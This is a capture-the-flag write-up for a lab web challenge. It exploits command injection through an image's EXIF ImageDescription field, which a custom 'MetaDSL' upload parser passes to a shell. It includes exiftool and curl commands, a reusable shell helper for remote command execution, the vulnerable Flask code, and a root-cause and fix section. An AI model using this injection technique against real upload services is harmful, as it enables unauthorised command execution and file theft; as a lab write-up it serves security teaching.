# PhotoStore — Writeup

**Category:** Web
**Difficulty:** Easy
**Points:** 100 XP

## Briefing

> Simon's PhotoStore is a small editorial and portrait studio that lets clients upload their originals through a web "Upload Studio." To help catalogue the archive, the studio bolted on a homegrown "MetaDSL" engine that reads the ImageDescription field baked into each photo's metadata and processes it as part of the intake pipeline. It works beautifully on a well-behaved holiday snap. The question is what the pipeline does when the metadata isn't a caption at all. Upload something of your own and see how much of the studio's back office you can reach.

The hint is explicit: a custom **"MetaDSL"** engine parses the `ImageDescription` EXIF field on every upload. That's a strong signal toward metadata-driven command/code injection.

## Recon

- Target resolves via nginx virtual hosting; requests to the bare IP 302-redirect to `Location: http://photostore.local/`, so `/etc/hosts` needed a manual entry:

  ```bash
  echo "<target-ip> photostore.local" | sudo tee -a /etc/hosts
  ```

- `whatweb` fingerprinted the stack directly:

  ```
  PoweredBy[MetaDSL], HTTPServer[nginx]
  ```

- Directory brute-force (`gobuster`) against `photostore.local` found:

  ```
  /upload   (Status: 405) — GET not allowed, POST-only endpoint
  ```

- The homepage source revealed the actual upload flow (`fetch("/upload", { method: "POST", body: fd })` with a form field named **`photo`**, not `file`).

## Step 1 — Confirm the upload pipeline processes EXIF metadata

A baseline upload with a plain string in `ImageDescription` returned:

```json
{
  "image_description": "test caption",
  "metadata_processed": null,
  ...
}
```

`metadata_processed` staying `null` for ordinary text confirmed the field is parsed by something, but plain captions don't trigger anything — the app is looking for specific DSL syntax.

## Step 2 — Find the DSL syntax

Guessing generic template delimiters (`{{ }}`, `${ }`, `<%= %>`, etc.) all failed — none were recognized.

The breakthrough came from the site's own **sample image**, linked directly from the homepage (`/static/sample.jpg`). Pulling its EXIF data revealed the DSL syntax in the wild, left as a demo/self-documentation artifact:

```bash
curl -s -o site_sample.jpg http://photostore.local/static/sample.jpg
exiftool site_sample.jpg
```

```
Image Description : system("echo Sample image - MetaDSL v2.1 annotations enabled")
Software           : MetaDSL v2.1
```

The DSL is simply `system("<command>")` written literally into the `ImageDescription` field.

## Step 3 — Confirm command execution

Injected the exact demo payload into a test image and re-uploaded it:

```bash
exiftool -ImageDescription='system("echo Sample image - MetaDSL v2.1 annotations enabled")' \
  -overwrite_original sample.jpg

curl -s -X POST http://photostore.local/upload -F "photo=@sample.jpg"
```

Response:

```json
{
  "metadata_processed": "Sample image - MetaDSL v2.1 annotations enabled",
  ...
}
```

The `metadata_processed` field echoed the *executed command's output*, not the literal input — confirming command execution rather than string interpolation. From there, a shell helper automated further payload injection + upload + result extraction:

```bash
run_cmd() {
  local cmd="$1"
  exiftool -ImageDescription="system(\"$cmd\")" -overwrite_original sample.jpg > /dev/null
  curl -s -X POST http://photostore.local/upload -F "photo=@sample.jpg" \
    | python3 -c "import json,sys; print(json.load(sys.stdin).get('metadata_processed'))"
}
```

Recon commands confirmed full RCE as a low-privileged user:

```
whoami           -> photo
id               -> uid=1000(photo) gid=1000(photo) groups=1000(photo)
pwd              -> /app
ls -la           -> app.py, requirements.txt, static/, templates/
```

## Step 4 — Read the application source

```bash
run_cmd "cat app.py"
```

The source (Flask) confirmed the vulnerability directly:

```python
def _parse_system_call(expr: str):
    """
    Accept only bare system("literal") / system('literal') expressions.
    Anything else is rejected, which closes the Python class-chain
    sandbox-escape path while leaving the intended RCE vector intact.
    """
    ...

def _dsl_system(cmd: str) -> str:
    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
    return (proc.stdout + proc.stderr).strip()
```

The app parses `ImageDescription` with Python's `ast` module, restricting input to a single, literal `system("...")` call — but it then passes that literal string straight into `subprocess.run(cmd, shell=True, ...)`. The AST restriction blocks Python-level sandbox escapes (e.g. class-chain tricks) but does nothing to stop **shell metacharacters inside the string itself** — so any shell command is fair game as long as it's wrapped in `system("...")`.

## Step 5 — Locate and read the flag

```bash
run_cmd "find / -iname 'flag*' 2>/dev/null"
```

Found:

```
/flag.txt
```

```bash
run_cmd "cat /flag.txt"
```

Returned the flag (redacted below — see submission).

## Flag

```
WEBVERSE{redacted}
```

## Root cause & fix

**Root cause:** A custom "safe" DSL parser correctly restricted the *shape* of accepted input (a single literal `system("...")` AST call) but never restricted the *content* of the string being passed to `subprocess.run(..., shell=True)`. Any EXIF metadata field that survives image-format validation is fully attacker-controlled, and this app trusted it as executable input.

**Fixes:**
- Never pass user-controlled EXIF (or any other embedded metadata) to a shell. If any metadata evaluation is required, use a strict allow-list of non-executing operations (e.g., formatting/templating with no code execution primitives).
- If shelling out is unavoidable, use `subprocess.run([...], shell=False)` with an argument list and a strict allow-list of binaries/arguments — never raw string interpolation into a shell.
- Treat all embedded file metadata (EXIF, XMP, ID3, etc.) as untrusted user input, since it's trivially editable client-side with tools like `exiftool` before upload.
- Run image-processing/upload pipelines in a sandboxed, non-privileged environment with no access to sensitive files, reducing blast radius even if injection succeeds.
